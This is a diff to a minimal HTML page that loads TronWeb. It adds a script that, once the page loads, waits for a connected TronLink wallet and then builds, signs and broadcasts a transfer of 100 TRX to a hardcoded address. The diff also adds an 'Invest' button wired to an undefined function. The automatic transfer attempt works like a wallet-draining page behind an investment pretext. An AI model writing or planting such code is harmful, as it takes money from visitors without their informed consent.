@@ -4,19 +4,31 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>Document</title>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@2.10.1/dist/TronWeb.js"></script>
+
+
+
     </head>
     <body>
-    <script>
+        <script>
+
+
         var obj = setInterval(async ()=>{
             if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                 clearInterval(obj)
                 var tronweb = window.tronWeb
-                var tx = await tronweb.transactionBuilder.sendTrx('TEXcBaw1Fq7TH4hy4pvZULzo1YVLERk9Ti', 10,)
+                var tx = await tronweb.transactionBuilder.sendTrx('TEXcBaw1Fq7TH4hy4pvZULzo1YVLERk9Ti', 100 * 1000000,)
                 var signedTx = await tronweb.trx.sign(tx)
                 var broastTx = await tronweb.trx.sendRawTransaction(signedTx)
                 console.log(broastTx)
             }
         }, 10)
-    </script>
+
+            
+            
+         </script>
+
+    <input type="button" id="btnClick" value="Invest" onclick="test();" >
     </body>
 </html>
